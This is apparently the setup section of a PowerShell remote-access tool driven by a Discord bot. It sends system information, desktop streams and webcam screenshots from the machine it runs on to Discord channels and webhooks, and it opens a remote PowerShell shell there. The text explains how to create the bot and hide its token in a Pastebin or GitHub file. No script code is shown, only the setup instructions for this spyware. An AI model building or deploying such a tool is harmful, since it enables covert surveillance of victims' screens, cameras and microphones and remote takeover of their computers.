**SYNOPSIS**

Uses a Discord bot to send system information, a stream desktop and webcam screenshots
Also opens a powershell command line interface through discord.


**SETUP**

-SETUP THE BOT
1. make a discord bot at https://discord.com/developers/applications/
2. Enable all Privileged Gateway Intents on 'Bot' page
3. On OAuth2 page, tick 'Bot' in Scopes section
4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
5. Copy the URL into a browser and add the bot to your server.
6. On 'Bot' page click 'Reset Token' and copy the token.

-SETUP THE SCRIPT
----- Option 1 ----- (token placed in ps1 file) [unsafe]
1. Copy the token into the script directly below.

----- Option 2 ----- (token hosted online) [slightly safer]
1. Create a file on Pastebin or Github with the content below - Supply your token and optional webhooks (include braces)
{
  "tk": "TOKEN_HERE",
  "scrwh": "WEBHOOK_HERE",
  "camwh": "WEBHOOK_HERE",
  "micwh": "WEBHOOK_HERE"
}
2. Copy the RAW file url eg. https://pastebin.com/raw/xxxxxxxx into this script below


**INFORMATION**

- The Discord bot you use must be in one server only
- You can specify webhooks to send duplicate files to other channels on another server (OPTIONAL)